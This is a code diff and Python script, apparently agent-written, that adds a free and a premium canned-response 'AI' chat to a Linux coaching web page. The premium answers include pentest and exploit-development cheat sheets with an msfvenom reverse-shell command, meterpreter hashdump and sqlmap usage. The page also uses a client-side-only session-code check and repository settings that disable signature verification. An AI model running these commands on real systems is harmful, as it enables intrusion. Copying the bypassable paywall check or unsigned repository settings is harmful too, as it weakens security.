-        function sendMessage() {
-            const input = document.getElementById('chatInput');
+        function sendPublicMessage() {
+            const input = document.getElementById('publicChatInput');
             const message = input.value.trim();
             
             if (!message) return;
             
-            // Add user message
-            addMessage(message, 'user');
+            addPublicMessage(message, 'user');
             input.value = '';
             
-            // Show typing indicator
-            showTypingIndicator();
+            showPublicTyping();
             
-            // Simulate AI response delay
             setTimeout(() => {
-                removeTypingIndicator();
-                const response = getAIResponse(message);
-                addMessage(response, 'ai');
-            }, 1500);
+                removePublicTyping();
+                const response = getPublicResponse(message);
+                addPublicMessage(response, 'ai');
+            }, 1200);
         }
 
-        function addMessage(content, sender) {
-            const container = document.getElementById('chatMessages');
+        function addPublicMessage(content, sender) {
+            const container = document.getElementById('publicChatMessages');
             const messageDiv = document.createElement('div');
             messageDiv.className = `message ${sender}-message`;
             
-            const avatar = sender === 'ai' ? '<i class="fas fa-robot"></i>' : '<i class="fas fa-user"></i>';
+            const avatar = sender === 'ai' 
+                ? '<i class="fas fa-graduation-cap"></i>' 
+                : '<i class="fas fa-user"></i>';
             
             messageDiv.innerHTML = `
-                <div class="message-avatar">${avatar}</div>
+                <div class="message-avatar ${sender === 'ai' ? 'public-avatar' : ''}">${avatar}</div>
                 <div class="message-content">${content}</div>
             `;
             
@@ -1870,13 +821,13 @@ What would you like to learn about?`
             container.scrollTop = container.scrollHeight;
         }
 
-        function showTypingIndicator() {
-            const container = document.getElementById('chatMessages');
+        function showPublicTyping() {
+            const container = document.getElementById('publicChatMessages');
             const typingDiv = document.createElement('div');
             typingDiv.className = 'message ai-message typing';
-            typingDiv.id = 'typingIndicator';
+            typingDiv.id = 'publicTypingIndicator';
             typingDiv.innerHTML = `
-                <div class="message-avatar"><i class="fas fa-robot"></i></div>
+                <div class="message-avatar public-avatar"><i class="fas fa-graduation-cap"></i></div>
                 <div class="message-content">
                     <div class="typing-indicator">
                         <div class="typing-dot"></div>
@@ -1889,12 +840,764 @@ What would you like to learn about?`
             container.scrollTop = container.scrollHeight;
         }
 
-        function removeTypingIndicator() {
-            const indicator = document.getElementById('typingIndicator');
-            if (indicator) {
-                indicator.remove();
+        function removePublicTyping() {
+            const indicator = document.getElementById('publicTypingIndicator');
+            if (indicator) indicator.remove();
+        }
+
+        // Premium AI Functions
+        function openSessionModal() {
+            document.getElementById('sessionModal').classList.add('active');
+        }
+
+        function closeSessionModal() {
+            document.getElementById('sessionModal').classList.remove('active');
+        }
+
+        function activateSession() {
+            const code = document.getElementById('sessionCode').value.trim().toUpperCase();
+            
+            // Simple validation - in real implementation, verify against backend
+            if (code.startsWith('LM-') && code.length >= 10) {
+                sessionActive = true;
+                sessionStartTime = new Date();
+                
+                // Hide public AI, show premium AI
+                document.getElementById('publicChatWidget').style.display = 'none';
+                document.getElementById('premiumChatWidget').style.display = 'block';
+                
+                closeSessionModal();
+                togglePremiumChat();
+                startSessionTimer();
+                
+                // Welcome message
+                setTimeout(() => {
+                    addPremiumMessage(`<i class="fas fa-check-circle" style="color: var(--accent-green);"></i> <strong>Session activated!</strong><br><br>Welcome to LinuxMaster Pro AI. You now have access to advanced knowledge across all Linux distributions, cybersecurity, and certification preparation.<br><br>Select a topic from the dropdown or tabs to get started!`, 'ai');
+                }, 500);
+            } else {
+                alert('Invalid session code. Format should be: LM-XXXX-XXXX');
             }
         }
+
+        function startSessionTimer() {
+            sessionTimerInterval = setInterval(() => {
+                if (!sessionStartTime) return;
+                
+                const now = new Date();
+                const diff = Math.floor((now - sessionStartTime) / 1000);
+                const minutes = Math.floor(diff / 60).toString().padStart(2, '0');
+                const seconds = (diff % 60).toString().padStart(2, '0');
+                
+                document.getElementById('sessionTimer').textContent = `Session: ${minutes}:${seconds}`;
+            }, 1000);
+        }
+
+        function togglePremiumChat() {
+            const container = document.getElementById('premiumChatContainer');
+            container.classList.toggle('active');
+            if (container.classList.contains('active')) {
+                document.getElementById('premiumChatInput').focus();
+            }
+        }
+
+        function handlePremiumChatKeypress(event) {
+            if (event.key === 'Enter') {
+                sendPremiumMessage();
+            }
+        }
+
+        function sendPremiumQuick(question) {
+            document.getElementById('premiumChatInput').value = question;
+            sendPremiumMessage();
+        }
+
+        function switchTab(tab) {
+            currentTab = tab;
+            document.querySelectorAll('.premium-tab').forEach(t => t.classList.remove('active'));
+            event.target.classList.add('active');
+            
+            // Update topic selector based on tab
+            const topicSelect = document.getElementById('premiumTopic');
+            switch(tab) {
+                case 'general':
+                    topicSelect.value = 'general';
+                    break;
+                case 'distro':
+                    topicSelect.value = 'ubuntu';
+                    break;
+                case 'cyber':
+                    topicSelect.value = 'cyber';
+                    break;
+                case 'cert':
+                    topicSelect.value = 'rhcsa';
+                    break;
+            }
+            updatePremiumContext();
+        }
+
+        function updatePremiumContext() {
+            currentTopic = document.getElementById('premiumTopic').value;
+        }
+
+        // Premium AI Knowledge Base (Comprehensive/Advanced)
+        const premiumKnowledge = {
+            // General Advanced
+            'advanced selinux policies': `<strong>Advanced SELinux Policy Management</strong>
+
+<div class="code-block"># View current policy
+sestatus
+getenforce
+
+# Manage booleans
+getsebool -a | grep httpd
+setsebool -P httpd_enable_homedirs on
+
+# Custom policy modules
+ausearch -m avc -ts recent
+audit2allow -a -M mypol
+semodule -i mypol.pp
+
+# File context management
+semanage fcontext -a -t httpd_sys_content_t "/web(/.*)?"
+restorecon -Rv /web
+
+# Troubleshooting
+cat /var/log/audit/audit.log | grep AVC
+sealert -a /var/log/audit/audit.log</div>
+
+<strong>Policy Types:</strong>
+• Targeted (default) - Specific processes confined
+• Strict - Everything confined
+• MLS - Multi-Level Security
+• MCS - Multi-Category Security
+
+<strong>Custom Policy Development:</strong>
+1. Create .te file with rules
+2. Compile with checkmodule
+3. Package with semodule_package
+4. Install with semodule`,
+
+            'kernel compilation': `<strong>Custom Kernel Compilation</strong>
+
+<div class="code-block"># Download kernel source
+wget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.5.tar.xz
+tar -xf linux-6.5.tar.xz
+cd linux-6.5
+
+# Configure
+make menuconfig      # NCurses interface
+make xconfig         # Qt interface
+make oldconfig       # Update existing
+
+# Compile
+make -j$(nproc)
+make modules_install
+make install
+
+# Update bootloader
+update-grub
+
+# Build custom kernel package (Debian)
+make deb-pkg
+
+# Gentoo specific
+make && make modules_install
+mount /boot
+cp arch/x86_64/boot/bzImage /boot/kernel-custom</div>
+
+<strong>Optimization Flags:</strong>
+• Processor family selection
+• Preemption model (desktop vs server)
+• Tickless operation
+• CPU frequency scaling
+• Memory management options`,
+
+            // Cybersecurity
+            'penetration testing methodology': `<strong>Penetration Testing Framework</strong>
+
+<div class="code-block"># Information Gathering
+nmap -sS -sV -O target.com
+nmap -A -T4 target.com
+dig +short target.com
+whois target.com
+theHarvester -d target.com -b all
+
+# Vulnerability Scanning
+nikto -h target.com
+openvas-setup
+nessuscli
+
+# Exploitation
+msfconsole
+searchsploit apache 2.4
+sqlmap -u "http://target.com/page.php?id=1"
+
+# Post-Exploitation
+meterpreter > sysinfo
+meterpreter > hashdump
+meterpreter > pivot
+
+# Reporting
+dracula-report
+covenant-report</div>
+
+<strong>Testing Phases:</strong>
+1. Pre-engagement
+2. Intelligence Gathering
+3. Threat Modeling
+4. Vulnerability Analysis
+5. Exploitation
+6. Post-Exploitation
+7. Reporting
+
+<strong>Legal Considerations:</strong>
+• Written authorization required
+• Scope definition
+• Rules of engagement
+• Data handling agreements`,
+
+            'network hardening': `<strong>Enterprise Network Hardening</strong>
+
+<div class="code-block"># iptables/nftables comprehensive rules
+*filter
+:INPUT DROP [0:0]
+:FORWARD DROP [0:0]
+:OUTPUT ACCEPT [0:0]
+
+# Allow established
+-A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
+
+# SSH with rate limiting
+-A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --set
+-A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 4 -j DROP
+
+# Allow specific services
+-A INPUT -p tcp --dport 80 -j ACCEPT
+-A INPUT -p tcp --dport 443 -j ACCEPT
+
+# Log and drop
+-A INPUT -j LOG --log-prefix "IPTABLES-DROP:"
+-A INPUT -j DROP
+
+COMMIT</div>
+
+<strong>Kernel Hardening:</strong>
+<div class="code-block"># /etc/sysctl.conf
+net.ipv4.ip_forward=0
+net.ipv4.conf.all.send_redirects=0
+net.ipv4.conf.all.accept_redirects=0
+net.ipv4.conf.all.accept_source_route=0
+net.ipv4.conf.all.log_martians=1
+kernel.randomize_va_space=2
+fs.suid_dumpable=0</div>
+
+<strong>Service Hardening:</strong>
+• Disable unused services
+• Run services in chroot
+• Use AppArmor/SELinux
+• Implement resource limits`,
+
+            'exploit development basics': `<strong>Exploit Development Fundamentals</strong>
+
+<div class="code-block"># Buffer Overflow Basics
+# Vulnerable C program
+#include <string.h>
+void vuln(char *input) {
+    char buffer[64];
+    strcpy(buffer, input);  // No bounds checking
+}
+
+# Exploitation steps:
+# 1. Find offset
+pattern_create.rb -l 200
+pattern_offset.rb -q 0x41414141
+
+# 2. Control EIP
+payload = "A" * 76 + "B" * 4
+
+# 3. Find bad characters
+for x in range(256):
+    payload += chr(x)
+
+# 4. Get shellcode
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -b "\\x00" -f python
+
+# 5. Final exploit
+payload = padding + ret_address + nops + shellcode</div>
+
+<strong>Memory Protections:</strong>
+• ASLR - Address Space Layout Randomization
+• NX/DEP - No Execute bit
+• Stack Canaries
+• PIE - Position Independent Executable
+• RELRO - Relocation Read-Only
+
+<strong>Bypass Techniques:</strong>
+• ROP chains (Return Oriented Programming)
+• JOP/COP (Jump/Call Oriented)
+• Format string attacks
+• Use-after-free
+• Integer overflows`,
+
+            // Certifications
+            'rhcsa exam preparation': `<strong>RHCSA (EX200) Exam Preparation</strong>
+
+<div class="code-block"># Essential Skills Checklist:
+
+# System Operations
+- Boot, reboot, shut down system
+- Boot into different targets
+- Interrupt boot process and modify kernel parameters
+- Identify CPU/memory intensive processes
+- Adjust process priority
+- Manage tuning profiles
+
+# File Systems
+- List, create, delete partitions
+- Create and remove LVM volumes
+- Configure swap space
+- Mount/unmount filesystems
+- Manage permissions and ownership
+- Configure ACLs
+
+# User Management
+- Create, modify, delete users/groups
+- Configure password policies
+- Configure sudo access
+- Set up SSH key-based auth
+
+# Networking
+- Configure IPv4/IPv6 addresses
+- Configure hostname resolution
+- Configure network bonding/team
+- Configure firewall (firewalld)
+
+# Security
+- Configure SELinux contexts
+- Configure SELinux booleans
+- Diagnose and correct SELinux violations
+
+# Containers
+- Run containers (podman)
+- Configure persistent storage
+- Configure networking</div>
+
+<strong>Exam Tips:</strong>
+• Practice on RHEL 9
+• Know your commands cold
+• Time management is critical
+• Read questions carefully
+• Use man pages if stuck`,
+
+            'ceh certification': `<strong>CEH (Certified Ethical Hacker) Prep</strong>
+
+<div class="code-block"># Module Coverage:
+
+# 1. Footprinting & Reconnaissance
+whois, dig, nslookup, theHarvester, Maltego
+
+# 2. Scanning Networks
+Nmap, Nessus, OpenVAS, Hping3
+
+# 3. Enumeration
+Enum4linux, SNMPwalk, LDAP enumeration
+
+# 4. System Hacking
+Password cracking (John, Hashcat)
+Privilege escalation techniques
+Steganography tools
+
+# 5. Malware Threats
+Virus analysis, Trojans, Worms
+
+# 6. Sniffing
+Wireshark, TCPDump, Ettercap
+
+# 7. Social Engineering
+SET (Social Engineering Toolkit)
+Phishing techniques
+
+# 8. Denial of Service
+LOIC, HOIC, Slowloris detection
+
+# 9. Session Hijacking
+Cookie theft, MITM attacks
+
+# 10. Web Application Hacking
+SQL injection, XSS, CSRF
+Burp Suite, OWASP ZAP
+
+# 11. SQL Injection
+Manual injection, SQLMap
+
+# 12. Wireless Hacking
+Aircrack-ng suite, WPS attacks
+
+# 13. Mobile Platform
+Android/iOS vulnerabilities
+
+# 14. IoT & OT Hacking
+SCADA systems, PLC security
+
+# 15. Cloud Computing
+AWS/Azure/GCP security
+Container security</div>
+
+<strong>Tools to Master:</strong>
+• Nmap, Wireshark, Metasploit
+• Burp Suite, SQLMap, Aircrack-ng
+• John the Ripper, Hashcat
+• Social Engineering Toolkit`,
+
+            'lpic certification': `<strong>LPIC-1 & LPIC-2 Certification Guide</strong>
+
+<div class="code-block"># LPIC-1 (101-500 & 102-500)
+
+# 101: System Architecture
+- Determine hardware resources
+- Boot systems
+- Change runlevels/boot targets
+- Design disk partitioning
+
+# 102: Linux Installation
+- Install boot managers
+- Manage shared libraries
+- Use Debian/APT package management
+- Use RPM/YUM package management
+
+# 103: GNU & Unix Commands
+- Work on command line
+- Process text streams using filters
+- Perform basic file management
+- Use streams, pipes, redirects
+- Create, monitor, kill processes
+- Modify process execution priorities
+- Search text using regular expressions
+- Perform basic file editing (vi)
+
+# 104: Devices, Filesystems, FHS
+- Create partitions and filesystems
+- Maintain filesystem integrity
+- Control mounting/unmounting
+- Manage disk quotas
+- Manage file permissions/ownership
+- Create hard/soft links
+- Find system files</div>
+
+<strong>LPIC-2 Topics:</strong>
+• Capacity planning
+• Linux kernel
+• System startup
+• Filesystem management
+• Advanced storage
+• Networking configuration
+• DNS, Web, Email, File servers
+• Security
+• Troubleshooting`,
+
+            // Distro-specific deep knowledge
+            'ubuntu deep': `<strong>Ubuntu Enterprise Deep Dive</strong>
+
+<div class="code-block"># Ubuntu Pro & Landscape
+sudo ua status
+sudo ua enable esm-infra
+sudo ua enable livepatch
+
+# Snaps vs Deb packages
+snap list
+snap info firefox
+snap install --classic code
+
+# Netplan advanced
+network:
+  version: 2
+  bonds:
+    bond0:
+      interfaces: [eth0, eth1]
+      parameters:
+        mode: 802.3ad
+        lacp-rate: fast
+  vlans:
+    vlan10:
+      id: 10
+      link: bond0
+
+# LXD containers
+lxc launch ubuntu:22.04 container1
+lxc exec container1 -- bash
+lxc file push local.txt container1/tmp/
+
+# Juju orchestration
+juju bootstrap
+juju deploy mysql
+juju add-unit mysql -n 2</div>
+
+<strong>Ubuntu Server Best Practices:</strong>
+• Unattended upgrades
+• Landscape management
+• MAAS (Metal as a Service)
+• MicroK8s for Kubernetes
+• Charmed operators`,
+
+            'arch deep': `<strong>Arch Linux Mastery</strong>
+
+<div class="code-block"># Advanced Installation
+# ZFS root with encryption
+modprobe zfs
+zpool create -f -o ashift=12 -O compression=zstd -O encryption=aes-256-gcm -O keyformat=passphrase zroot /dev/nvme0n1p2
+zfs create -o mountpoint=none zroot/ROOT
+zfs create -o mountpoint=/ zroot/ROOT/arch
+
+# AUR Helper security
+# Review PKGBUILDs manually
+makepkg -si
+# Or use paru with review
+paru -S package --review
+
+# Custom repository
+# /etc/pacman.conf
+[custom]
+SigLevel = Optional TrustAll
+Server = file:///var/cache/pacman/custom
+
+# repo-add custom.db.tar.gz *.pkg.tar.zst
+
+# Initramfs customization
+# /etc/mkinitcpio.conf
+HOOKS=(base udev autodetect keyboard keymap consolefont modconf block encrypt filesystems fsck)
+
+# Kernel parameters optimization
+# /etc/default/grub
+GRUB_CMDLINE_LINUX_DEFAULT="quiet loglevel=3 zswap.enabled=1 nowatchdog"</div>
+
+<strong>Arch Advanced Topics:</strong>
+• Custom PKGBUILD development
+• Repository management
+• Initramfs customization
+• Kernel patching
+• systemd-boot vs GRUB`,
+
+            'kali deep': `<strong>Kali Linux Professional</strong>
+
+<div class="code-block"># Kali customization
+# Build custom ISO
+apt install git live-build cdebootstrap
+git clone https://gitlab.com/kalilinux/build-scripts/live-build-config.git
+cd live-build-config
+./build.sh --variant custom
+
+# Encrypted persistence
+cryptsetup --verbose --verify-passphrase luksFormat /dev/sdb2
+cryptsetup luksOpen /dev/sdb2 my_usb
+mkfs.ext4 -L persistence /dev/mapper/my_usb
+
+# Custom tools repository
+# /etc/apt/sources.list.d/custom.list
+deb [trusted=yes] https://your-repo.com/tools ./
+
+# Metapackages
+apt-cache search kali-linux
+kali-linux-headless    # Minimal
+kali-linux-everything  # All tools
+kali-tools-top10       # Popular 10
+
+# ARM builds
+# Cross-compilation for Raspberry Pi
+apt install gcc-arm-linux-gnueabihf
+# Build custom ARM images
+
+# Wireless advanced
+airmon-ng check kill
+iw dev wlan0 set type monitor
+airodump-ng --band abg wlan0mon</div>
+
+<strong>Professional Usage:</strong>
+• Custom tool development
+• Automated testing frameworks
+• Reporting integration
+• Wireless assessment hardware
+• Hardware key (USB Armory)`,
+
+            'default': `<strong>LinuxMaster Pro AI Active</strong>
+
+You have access to comprehensive knowledge including:
+
+<strong>Advanced Topics:</strong>
+• Custom kernel compilation
+• SELinux policy development
+• Enterprise deployment
+• High availability clustering
+• Performance tuning
+
+<strong>Cybersecurity:</strong>
+• Penetration testing methodologies
+• Exploit development
+• Network hardening
+• Incident response
+• Digital forensics
+
+<strong>Certifications:</strong>
+• RHCSA/RHCE preparation
+• CEH (Certified Ethical Hacker)
+• LPIC-1/LPIC-2
+• CompTIA Linux+
+
+<strong>Distro Expertise:</strong>
+• Ubuntu/Debian enterprise
+• RHEL/CentOS administration
+• Arch Linux customization
+• Gentoo optimization
+• Kali/Security distros
+
+Select a topic from the dropdown or ask any advanced question!`
+        };
+
+        function getPremiumResponse(userMessage) {
+            const lowerMsg = userMessage.toLowerCase();
+            const topic = currentTopic;
+            
+            // Check for specific advanced topics
+            if (lowerMsg.includes('selinux') || lowerMsg.includes('semanage') || lowerMsg.includes('policy')) {
+                return premiumKnowledge['advanced selinux policies'];
+            }
+            if (lowerMsg.includes('kernel') || lowerMsg.includes('compile') || lowerMsg.includes('custom kernel')) {
+                return premiumKnowledge['kernel compilation'];
+            }
+            if (lowerMsg.includes('pentest') || lowerMsg.includes('methodology') || lowerMsg.includes('framework')) {
+                return premiumKnowledge['penetration testing methodology'];
+            }
+            if (lowerMsg.includes('hardening') || lowerMsg.includes('security') || lowerMsg.includes('iptables')) {
+                return premiumKnowledge['network hardening'];
+            }
+            if (lowerMsg.includes('exploit') || lowerMsg.includes('buffer overflow') || lowerMsg.includes('shellcode')) {
+                return premiumKnowledge['exploit development basics'];
+            }
+            if (lowerMsg.includes('rhcsa') || lowerMsg.includes('red hat cert')) {
+                return premiumKnowledge['rhcsa exam preparation'];
+            }
+            if (lowerMsg.includes('ceh') || lowerMsg.includes('ethical hacker')) {
+                return premiumKnowledge['ceh certification'];
+            }
+            if (lowerMsg.includes('lpic') || lowerMsg.includes('lpi')) {
+                return premiumKnowledge['lpic certification'];
+            }
+            
+            // Topic-based responses
+            if (topic === 'ubuntu' && lowerMsg.includes('deep')) {
+                return premiumKnowledge['ubuntu deep'];
+            }
+            if (topic === 'arch' && lowerMsg.includes('deep')) {
+                return premiumKnowledge['arch deep'];
+            }
+            if (topic === 'kali' && lowerMsg.includes('deep')) {
+                return premiumKnowledge['kali deep'];
+            }
+            
+            return premiumKnowledge['default'];
+        }
+
+        function sendPremiumMessage() {
+            const input = document.getElementById('premiumChatInput');
+            const message = input.value.trim();
+            
+            if (!message) return;
+            
+            addPremiumMessage(message, 'user');
+            input.value = '';
+            
+            showPremiumTyping();
+            
+            setTimeout(() => {
+                removePremiumTyping();
+                const response = getPremiumResponse(message);
+                addPremiumMessage(response, 'ai');
+            }, 1500);
+        }
+
+        function addPremiumMessage(content, sender) {
+            const container = document.getElementById('premiumChatMessages');
+            const messageDiv = document.createElement('div');
+            messageDiv.className = `message ${sender}-message`;
+            
+            const avatar = sender === 'ai' 
+                ? '<i class="fas fa-crown"></i>' 
+                : '<i class="fas fa-user"></i>';
+            
+            const avatarClass = sender === 'ai' ? 'premium-avatar' : '';
+            
+            messageDiv.innerHTML = `
+                <div class="message-avatar ${avatarClass}">${avatar}</div>
+                <div class="message-content">${content}</div>
+            `;
+            
+            container.appendChild(messageDiv);
+            container.scrollTop = container.scrollHeight;
+        }
+
+        function showPremiumTyping() {
+            const container = document.getElementById('premiumChatMessages');
+            const typingDiv = document.createElement('div');
+            typingDiv.className = 'message ai-message typing';
+            typingDiv.id = 'premiumTypingIndicator';
+            typingDiv.innerHTML = `
+                <div class="message-avatar premium-avatar"><i class="fas fa-crown"></i></div>
+                <div class="message-content">
+                    <div class="typing-indicator">
+                        <div class="typing-dot" style="background: var(--accent-orange);"></div>
+                        <div class="typing-dot" style="background: var(--accent-orange);"></div>
+                        <div class="typing-dot" style="background: var(--accent-orange);"></div>
+                    </div>
+                </div>
+            `;
+            container.appendChild(typingDiv);
+            container.scrollTop = container.scrollHeight;
+        }
+
+        function removePremiumTyping() {
+            const indicator = document.getElementById('premiumTypingIndicator');
+            if (indicator) indicator.remove();
+        }
+
+        // Add session activation button to booking modal
+        document.addEventListener('DOMContentLoaded', function() {
+            const bookingModal = document.getElementById('bookingModal');
+            if (bookingModal) {
+                // Add session activation link
+                const form = bookingModal.querySelector('.modal-form');
+                if (form) {
+                    const sessionLink = document.createElement('div');
+                    sessionLink.innerHTML = `
+                        <p style="text-align: center; margin-top: 1rem; padding-top: 1rem; border-top: 1px solid var(--border);">
+                            Already booked? <a href="#" onclick="closeModal(); openSessionModal(); return false;" style="color: var(--accent-orange);">Activate session code</a>
+                        </p>
+                    `;
+                    form.appendChild(sessionLink);
+                }
+            }
+        });
     </script>
-</body>
-</html>
+'''
+
+# Find where to insert the new chat system (before the closing body tag)
+if '</body>' in content:
+    # Remove any existing chat widget if present (simple removal)
+    # Insert the new dual-AI system before </body>
+    content = content.replace('</body>', new_chat_system + '\n</body>')
+else:
+    # If no closing body tag, append at the end
+    content = content + new_chat_system
+
+# Save the updated file
+output_path = '/mnt/agents/output/linux_coaching_dual_ai.html'
+with open(output_path, 'w') as f:
+    f.write(content)
+
+print("Dual AI System created successfully!")
+print(f"File saved to: {output_path}")
+print("\nFeatures:")
+print("- Public AI (Free): Basic Linux tips, limited depth")
+print("- Premium AI (Paid): Advanced knowledge, cybersecurity, certifications")
+print("- Session activation system with code validation")
+print("- Topic-based tabs for Premium AI")
+print("- Session timer for active sessions")
+print("- Distro-specific deep knowledge")
